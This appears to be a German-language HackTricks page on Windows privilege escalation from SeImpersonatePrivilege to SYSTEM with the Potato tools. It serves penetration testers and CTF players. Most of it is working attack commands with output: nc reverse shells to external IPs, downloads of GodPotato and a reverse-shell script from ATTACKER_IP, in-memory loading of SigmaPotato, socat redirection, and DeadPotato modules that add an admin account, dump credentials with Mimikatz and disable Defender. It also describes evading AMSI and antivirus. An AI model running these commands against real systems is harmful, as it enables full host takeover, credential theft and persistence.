# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato funktioniert nicht** auf Windows Server 2019 und Windows 10 ab Build 1809. Allerdings können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)** und [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** verwendet werden, um **dieselben Privilegien auszunutzen und Zugriff auf der Ebene von `NT AUTHORITY\SYSTEM`** zu erlangen. Dieser [Blogbeitrag](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) geht ausführlich auf das Tool `PrintSpoofer` ein, mit dem sich Impersonation-Privilegien auf Windows-10- und Server-2019-Hosts ausnutzen lassen, auf denen JuicyPotato nicht mehr funktioniert.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Eine moderne, 2024–2025 häufig gewartete Alternative ist SigmaPotato (ein Fork von GodPotato), das die Verwendung im Speicher und via .NET Reflection sowie eine erweiterte Betriebssystemunterstützung hinzufügt. Siehe unten die Kurzanleitung und das Repo unter References.

Verwandte Seiten mit Hintergrundinformationen und manuellen Techniken:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Anforderungen und häufige Stolperfallen

Alle folgenden Techniken beruhen darauf, einen privilegierten Dienst mit Impersonation-Fähigkeit aus einem Kontext auszunutzen, der eines dieser Privilegien besitzt:

- SeImpersonatePrivilege (am häufigsten) oder SeAssignPrimaryTokenPrivilege
- Hohe Integrität ist nicht erforderlich, wenn das Token bereits über SeImpersonatePrivilege verfügt (typisch für viele Dienstkonten wie IIS AppPool, MSSQL usw.)

Privilegien schnell überprüfen:

```cmd
whoami /priv | findstr /i impersonate
```

Betriebshinweise:

- Wenn deine Shell mit einem eingeschränkten Token ohne SeImpersonatePrivilege läuft (häufig bei Local Service/Network Service in manchen Kontexten), stelle mit FullPowers die Standardberechtigungen des Kontos wieder her und führe dann einen Potato aus. Beispiel: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Ein Prozesstoken kann weniger Berechtigungen haben als ein anderes Token desselben Dienstkontos oder derselben Anmeldesitzung. In manchen Konfigurationen kann ein Named-Pipe-Client derselben Sitzung ein anderes Token mit SeImpersonatePrivilege verfügbar machen. Die konfigurierte `RequiredPrivileges` des Dienstes und `whoami /priv` beschreiben jedoch unterschiedliche Dinge und beweisen nicht, dass ein solches Token verfügbar ist. Überprüfe das tatsächliche Token, bevor du einen Impersonation-Pfad in Betracht ziehst.
- PrintSpoofer benötigt einen laufenden Print Spooler-Dienst, der über den lokalen RPC-Endpunkt (spoolss) erreichbar ist. In gehärteten Umgebungen, in denen Spooler nach PrintNightmare deaktiviert wurde, solltest du RoguePotato/GodPotato/DCOMPotato/EfsPotato bevorzugen.
- RoguePotato benötigt einen über TCP/135 erreichbaren OXID-Resolver. Wenn ausgehender Traffic blockiert ist, verwende einen Redirector/Port-Forwarder (siehe Beispiel unten). Prüfe, welche Flags der verwendete Build unterstützt.
- EfsPotato/SharpEfsPotato missbrauchen MS-EFSR. Wenn eine Pipe blockiert ist, probiere alternative Pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fehler 0x6d3 bei RpcBindingSetAuthInfo deutet normalerweise auf einen unbekannten/nicht unterstützten RPC-Authentifizierungsdienst hin. Probiere eine andere Pipe/einen anderen Transport oder stelle sicher, dass der Zieldienst läuft.
- „Kitchen-sink“-Forks wie DeadPotato bündeln zusätzliche Payload-Module (Mimikatz/SharpHound/Defender off), die auf die Festplatte zugreifen. Rechne im Vergleich zu den schlanken Originalen mit einer höheren EDR-Erkennungswahrscheinlichkeit.

## Kurzdemo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Hinweise:
- Mit `-i` kannst du einen interaktiven Prozess in der aktuellen Konsole starten oder mit `-c` einen Einzeiler ausführen.
- Erfordert den Spooler-Dienst. Ist dieser deaktiviert, schlägt der Vorgang fehl.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

In der [upstream usage](https://github.com/antonioCoco/RoguePotato#usage) gibt `-e` den Befehl an, `-l` wählt den lokalen Resolver-Port und das optionale `-c` wählt eine CLSID. Wenn durch die COM-Aktivierung ein Dienst gestartet wird, dessen ausführbarer Pfad bereits geändert wurde, kann dieser Dienst den geänderten Befehl unabhängig von der Token-Impersonation ausführen. Prüfe die Dienstkonfiguration, bevor du eine beobachtete SYSTEM-Ausführung dieser Technik zuschreibst.

Wenn ausgehender Traffic auf Port 135 blockiert ist, leite den OXID-Resolver über socat auf deinem Redirector um:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato ist eine neuere COM-Missbrauchsprimitive, die Ende 2022 veröffentlicht wurde und den **PrintNotify**-Dienst statt Spooler/BITS angreift. Die Binärdatei instanziiert den PrintNotify-COM-Server, tauscht ein gefälschtes `IUnknown` ein und löst dann über `CreatePointerMoniker` einen privilegierten Callback aus. Wenn sich der PrintNotify-Dienst (der als **SYSTEM** läuft) zurückverbindet, dupliziert der Prozess das zurückgegebene Token und startet die angegebene Payload mit vollen Privilegien.<sup>[[13]](#references)</sup>

Wichtige Hinweise zur Verwendung:

* Funktioniert unter Windows 10/11 und Windows Server 2012–2022, sofern der Print Workflow/PrintNotify-Dienst installiert ist (er ist auch vorhanden, wenn der veraltete Spooler nach PrintNightmare deaktiviert wurde).
* Erfordert, dass der Aufrufkontext über **SeImpersonatePrivilege** verfügt (typisch für IIS APPPOOL-, MSSQL- und Dienstkonten geplanter Tasks).
* Akzeptiert entweder einen direkten Befehl oder einen interaktiven Modus, sodass du in der ursprünglichen Konsole bleiben kannst. Beispiel:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Da es ausschließlich auf COM basiert, sind weder Named-Pipe-Listener noch externe Redirectors erforderlich. Dadurch ist es ein Drop-in-Ersatz auf Hosts, auf denen Defender das RPC-Binding von RoguePotato blockiert.

Operatoren wie Ink Dragon führen PrintNotifyPotato unmittelbar nach dem Erlangen von ViewState-RCE auf SharePoint aus, um vom `w3wp.exe`-Workerprozess zu SYSTEM zu wechseln, bevor sie ShadowPad installieren.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Tipp: Wenn eine Pipe fehlschlägt oder von EDR blockiert wird, probieren Sie die andere unterstützte Pipe aus:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Hinweise:
- Funktioniert unter Windows 8/8.1–11 und Server 2012–2022, sofern SeImpersonatePrivilege vorhanden ist.
- Verwende die Binärdatei, die zur installierten Runtime passt (z. B. `GodPotato-NET4.exe` auf einem aktuellen Server 2022).
- Wenn dein anfänglicher Ausführungsmechanismus ein Webshell/UI mit kurzen Timeouts ist, lege die Payload als Skript ab und bitte GodPotato, sie auszuführen, statt einen langen Inline-Befehl zu verwenden.<sup>[[12]](#references)</sup>

Schnelles Staging-Muster für ein beschreibbares IIS-Webroot:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bietet zwei Varianten, die auf DCOM-Serviceobjekte abzielen, bei denen standardmäßig RPC_C_IMP_LEVEL_IMPERSONATE eingestellt ist. Kompiliere die bereitgestellten Binaries oder verwende sie und führe deinen Befehl aus:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (aktualisierter GodPotato-Fork)

SigmaPotato bietet moderne Annehmlichkeiten wie die In-Memory-Ausführung über .NET-Reflection und einen PowerShell-Reverse-Shell-Helfer.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Zusätzliche Vorteile in Builds von 2024–2025 (v1.2.x):
- Integriertes Reverse-Shell-Flag `--revshell` und Aufhebung des 1024-Zeichen-Limits für PowerShell, sodass lange AMSI-bypassing-Payloads auf einmal ausgeführt werden können.
- Reflection-freundliche Syntax (`[SigmaPotato]::Main()`) sowie ein rudimentärer AV-Evasion-Trick mit `VirtualAllocExNuma()`, um einfache Heuristiken zu überlisten.
- Separate `SigmaPotatoCore.exe`, kompiliert gegen .NET 2.0 für PowerShell-Core-Umgebungen.

### DeadPotato (GodPotato-Rework von 2024 mit Modulen)

DeadPotato behält die GodPotato-OXID/DCOM-Impersonation-Kette bei, integriert aber Post-Exploitation-Helfer, sodass Operatoren sofort SYSTEM-Rechte erlangen und Persistenz/Sammlung durchführen können, ohne zusätzliche Tools zu benötigen.<sup>[[15]](#references)</sup>

Gängige Module (alle erfordern SeImpersonatePrivilege):

- `-cmd "<cmd>"` — beliebigen Befehl als SYSTEM starten.
- `-rev <ip:port>` — schnelle Reverse Shell.
- `-newadmin user:pass` — lokalen Admin für Persistenz erstellen.
- `-mimi sam|lsa|all` — Mimikatz ablegen und ausführen, um Anmeldedaten zu dumpen (schreibt auf die Festplatte und ist auffällig).
- `-sharphound` — SharpHound-Sammlung als SYSTEM ausführen.
- `-defender off` — den Echtzeitschutz von Defender deaktivieren (sehr auffällig).

Beispiele für Einzeiler:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Da es zusätzliche Binärdateien mitliefert, ist mit mehr AV/EDR-Alarmen zu rechnen; wenn Stealth wichtig ist, verwende das schlankere GodPotato/SigmaPotato.

## References

- [1] [PrintSpoofer – Missbrauch von Impersonation-Berechtigungen unter Windows 10 und Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Kein JuicyPotato mehr? Alte Geschichte, willkommen RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Standard-Tokenberechtigungen für Dienstkonten wiederherstellen](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP-NTLM-leak → NTFS-Junction zum Webroot RCE → FullPowers + GodPotato zu SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice-Makro → IIS-Webshell → GodPotato zu SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation enthüllt](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Überarbeitung von GodPotato mit integrierten Post-Ex-Modulen](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
